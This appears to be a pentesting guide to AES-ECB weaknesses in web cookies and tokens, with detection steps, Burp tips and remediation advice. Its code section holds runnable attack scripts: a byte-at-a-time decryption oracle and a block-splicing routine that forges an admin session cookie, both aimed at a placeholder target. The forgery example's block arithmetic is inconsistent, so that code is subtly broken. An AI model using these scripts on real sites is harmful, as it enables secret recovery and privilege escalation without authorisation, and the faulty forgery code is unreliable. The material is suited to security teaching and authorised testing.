# ECB Mode Encryption Detection

## Overview
Electronic Codebook (ECB) mode is the simplest block cipher mode of operation. In ECB mode, each plaintext block is encrypted independently with the same key. This fundamental design flaw means that identical plaintext blocks produce identical ciphertext blocks, making the encryption structurally deterministic and exposing patterns from the original plaintext in the ciphertext. Web applications that use ECB mode for encrypting cookies, tokens, or data are vulnerable to byte-at-a-time decryption attacks, ciphertext block rearrangement, and chosen-plaintext attacks.

## How It Works
In ECB mode, a message is split into fixed-size blocks (16 bytes for AES), and each block is encrypted independently:

```
C[1] = E(K, P[1])
C[2] = E(K, P[2])
C[3] = E(K, P[3])
```

Since each block is encrypted with the same key and no chaining, two identical plaintext blocks always produce the same ciphertext block. This has several exploitable consequences:

1. **Pattern leakage:** An image encrypted with AES-ECB retains visible structure (the famous "ECB penguin" — encrypting a bitmap produces a recognizable output). Similarly, structured data like JSON, cookies, or database records leak structural information.

2. **Chosen-plaintext byte-at-a-time decryption:** If an attacker can inject arbitrary prefix/suffix data into the plaintext that the server will encrypt with their key, they can recover unknown bytes one at a time by crafting inputs that isolate the unknown byte into a block and brute-forcing its value.

3. **Block rearrangement / splicing:** Since blocks are encrypted independently, an attacker can cut and paste ciphertext blocks from different encryptions to forge new messages. For example, if a cookie contains `role=user|expiry=2025` and blocks are aligned such that `user` and `admin` occupy the same block position in different encryptions, the attacker can swap the block.

4. **Replay attacks:** Reusing ciphertext blocks from prior valid encryptions to inject attacker-controlled plaintext into a new context.

## Impact
- Chosen-plaintext byte-at-a-time attack: full decryption of server-side secrets or unknown plaintext bytes when the attacker controls part of the plaintext.
- Block rearrangement: privilege escalation by swapping role/permission blocks in encrypted cookies or tokens.
- Pattern recognition in structured data: inferring database content from ciphertext patterns.
- Forging valid encrypted tokens by splicing blocks from multiple captured ciphertexts.
- If the application uses ECB-encrypted tokens for authentication, an attacker may be able to construct an admin-level token from a regular user token.

## Where to Look
- **Encrypted cookies:** any cookie with a Base64/hex-encoded value of length that is a multiple of the block size (multiples of 16 bytes = AES, multiples of 8 bytes = DES).
- **URL parameters:** `?session=...`, `?token=...`, `?auth=...` containing encrypted blobs.
- **Hidden form fields** with encrypted values.
- **API tokens** that have a fixed-length structure and look block-aligned.
- **Registration/profile flows:** if you control a significant portion of the input (username, address, profile fields) that gets encrypted server-side and returned, you can test for ECB by submitting repeated blocks.
- **AES-128-ECB** produces ciphertext blocks of exactly 16 bytes; if you see Base64 tokens where the length is a multiple of 16, ECB is possible.

## Testing Steps
1. Identify all encrypted parameters in the application.
2. Decode the encrypted value from Base64 or hex and check if its length is a multiple of 16 (AES) or 8 (DES).
3. **Identical block test:** Register two accounts with usernames that are exactly 32 characters long, where the first 16 characters are all 'A' and the second 16 characters are all 'A'. If the encrypted token contains two identical consecutive 16-byte blocks, the application uses ECB mode.
4. **Repetition test:** Submit controlled input that repeats the same plaintext block two or three times (e.g., username = `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`). Decode the resulting ciphertext and look for repeated 16-byte blocks.
5. If ECB is confirmed, attempt byte-at-a-time decryption if you can control a prefix that is encrypted alongside a secret.
6. Attempt block rearrangement: capture multiple legitimate ciphertexts, split them into 16-byte blocks, and reassemble in a different order.
7. For visual confirmation: if the application encrypts image data or structured binary, the ECB penguin pattern will be visible.
8. Compare ciphertext from two different encryptions of inputs that share some plaintext blocks — duplicate ciphertext blocks confirm ECB.

## Payloads / Techniques

```python
# ===== ECB DETECTION: Repeated Block Test =====

import requests, base64

# Submit a long repeated input and look for repeated blocks in the ciphertext
# The key insight: if input contains repeated 16-byte blocks, ECB output will too

def detect_ecb(ciphertext_b64):
    """Returns True if ciphertext contains repeated 16-byte blocks (ECB detected)."""
    ct = base64.b64decode(ciphertext_b64)
    blocks = [ct[i:i+16] for i in range(0, len(ct), 16)]
    return len(blocks) != len(set(blocks))

# Test: submit a username of 48 'A' chars (3 identical 16-byte blocks)
payload_input = "A" * 48

response = requests.post("https://target.example.com/register", json={
    "username": payload_input,
    "password": "TestPassword1!"
})

# Extract encrypted token from response cookie or body
token = response.cookies.get("session") or response.json().get("token")
if token:
    if detect_ecb(token):
        print("[!] ECB MODE DETECTED - repeated blocks found in ciphertext!")
    else:
        print("[-] No repeated blocks detected (may not be ECB, or input not fully in ciphertext)")


# ===== ECB BYTE-AT-A-TIME DECRYPTION =====
# Applicable when: attacker controls PREFIX + server appends SECRET, then encrypts

def ecb_byte_at_a_time(url, param_name):
    """Basic ECB byte-at-a-time oracle."""
    block_size = 16
    known_bytes = b""

    while True:
        # Craft input so target byte is at end of a block
        padding_len = block_size - (len(known_bytes) % block_size) - 1
        base_payload = "A" * padding_len

        # Get the "target" ciphertext block with the unknown byte at the end
        r = requests.post(url, json={param_name: base_payload})
        target_block_idx = (padding_len + len(known_bytes)) // block_size
        token = base64.b64decode(r.cookies.get("session"))
        target_block = token[target_block_idx*16:(target_block_idx+1)*16]

        # Brute-force the unknown byte
        found = False
        for byte_val in range(256):
            candidate = base_payload.encode() + known_bytes + bytes([byte_val])
            r2 = requests.post(url, json={param_name: candidate.decode('latin1')})
            candidate_token = base64.b64decode(r2.cookies.get("session"))
            candidate_block = candidate_token[target_block_idx*16:(target_block_idx+1)*16]
            if candidate_block == target_block:
                known_bytes += bytes([byte_val])
                print(f"Recovered so far: {known_bytes}")
                found = True
                break

        if not found:
            break  # Likely reached padding byte

    return known_bytes


# ===== ECB BLOCK REARRANGEMENT (Cookie Forgery) =====

import base64

# Scenario: app encrypts "username=<input>&role=user" with AES-128-ECB
# Block layout (16-byte blocks):
#   Block 0: "username=AAAAAA" (16 bytes) — we control 6 A's
#   Block 1: "AAadmin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" — craft this block (pad "admin" to 16 bytes with PKCS7)
#   Block 2: "&role=user\x06\x06\x06\x06\x06\x06" — this is the block we want to replace

# Step 1: Get a ciphertext where Block 1 = encrypted("admin" + PKCS7 padding)
username_for_admin_block = "AAAAAA" + "admin" + "\x0b" * 11  # 6 filler + "admin" + 11 bytes PKCS7 padding
r1 = requests.post("https://target.example.com/register", json={"username": username_for_admin_block})
ct1 = base64.b64decode(r1.cookies.get("session"))
admin_block = ct1[16:32]  # This is E("admin\x0b\x0b...\x0b\x0b\x0b")

# Step 2: Get a ciphertext where Block 2 = encrypted("&role=user...")
username_for_role_alignment = "AAAAAAAAAA"  # 10 chars: "username=" (9) + 10 = 19 bytes, Block 1 = "A&role=user..."
# Adjust padding so "&role=user" starts at Block 2 boundary
r2 = requests.post("https://target.example.com/register", json={"username": "A" * 6})
ct2 = base64.b64decode(r2.cookies.get("session"))

# Step 3: Replace Block 2 of ct2 with admin_block
forged = ct2[:32] + admin_block  # Blocks 0,1 from ct2 + Block 2 = admin block
forged_b64 = base64.b64encode(forged).decode()
print("Forged admin token:", forged_b64)
# Submit forged_b64 as the session cookie


# ===== VISUAL ECB DETECTION FOR BINARY DATA =====
from PIL import Image
import io

def visualize_ecb(ciphertext_bytes, width=None):
    """Convert ciphertext to image to visualize ECB block patterns."""
    if width is None:
        width = 16  # AES block size
    height = len(ciphertext_bytes) // width
    img = Image.frombytes('L', (width, height), ciphertext_bytes[:width*height])
    img.save('/tmp/ecb_visualization.png')
    print("Saved visualization to /tmp/ecb_visualization.png")
```

```bash
# Check if a Base64 token has a length that is a multiple of 16 (AES block aligned)
TOKEN="YourBase64TokenHere=="
python3 -c "
import base64, sys
ct = base64.b64decode('$TOKEN')
n = len(ct)
print(f'Ciphertext length: {n} bytes')
print(f'AES block aligned (multiple of 16): {n % 16 == 0}')
print(f'DES block aligned (multiple of 8): {n % 8 == 0}')
blocks = [ct[i:i+16].hex() for i in range(0, n, 16)]
print('Blocks:', blocks)
unique_blocks = set(blocks)
if len(blocks) != len(unique_blocks):
    print('[!] REPEATED BLOCKS DETECTED — ECB MODE CONFIRMED')
else:
    print('No repeated blocks in current sample.')
"

# Hexdump to visually inspect block patterns
echo -n "YourBase64TokenHere==" | base64 -d | xxd
```

## Burp Suite Tips
- Capture a registration or login request in **Proxy > HTTP History** that returns an encrypted cookie or token.
- Send the request to **Repeater**. Change the username/input field to `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` (48 'A' characters) and resend.
- Take the returned cookie, decode it in **Decoder** (Base64 → Hex), and visually inspect for repeating 16-byte (32 hex char) sequences.
- Use the **Hackvertor** BApp to decode, hex-dump, and analyze binary tokens directly in Burp's editor.
- In **Intruder**, use a **Cluster Bomb** attack to test different input lengths and observe how the ciphertext changes in length — if it grows in 16-byte increments, it's block cipher; if it's always the same length (HMAC or stream), it's different.
- The **Cipher Suite Inspector** BApp can help identify the encryption algorithm based on output characteristics.
- Compare two encrypted values in **Comparer** (Tool: Comparer → Hex view) to identify shared blocks between two different encryptions — common in ECB.

## Tools
- Python (base64, struct for manual analysis)
- CyberChef — https://gchq.github.io/CyberChef/ (excellent for block analysis in the browser)
- Burp Suite (Decoder, Comparer, Repeater)
- Hackvertor BApp
- hashcat (for certain ECB-based token formats)
- openssl (verify encryption mode in source code review)

## Remediation
- Replace ECB mode with an authenticated encryption mode: **AES-GCM** or **ChaCha20-Poly1305** are strongly recommended. These modes provide confidentiality, integrity, and authenticate additional data (AAD).
- If you must use non-AEAD modes: use **AES-CBC** with a random IV and then apply **Encrypt-then-MAC** (HMAC-SHA256 over ciphertext + IV) to detect tampering.
- Never reuse the same IV for CBC mode encryption.
- Use well-audited libraries rather than implementing custom cryptography:
  - Python: `from cryptography.hazmat.primitives.ciphers.aead import AESGCM`
  - Java: `Cipher.getInstance("AES/GCM/NoPadding")`
  - Node.js: `crypto.createCipheriv('aes-256-gcm', key, iv)`
- Tokens and cookies that carry authorization claims should be signed and verified (e.g., JWT with RS256/ES256) rather than encrypted with symmetric ciphers, unless confidentiality of claims is also required.
- Audit all existing encrypted storage for ECB usage and plan a migration with versioned encryption schemes.

## References
https://owasp.org/www-community/vulnerabilities/Using_ECB_Encryption_Mode
https://portswigger.net/web-security/cryptography/ecb-mode
https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html
https://filippo.io/the-ecb-penguin/
https://cryptopals.com/sets/2
https://www.rfc-editor.org/rfc/rfc3602
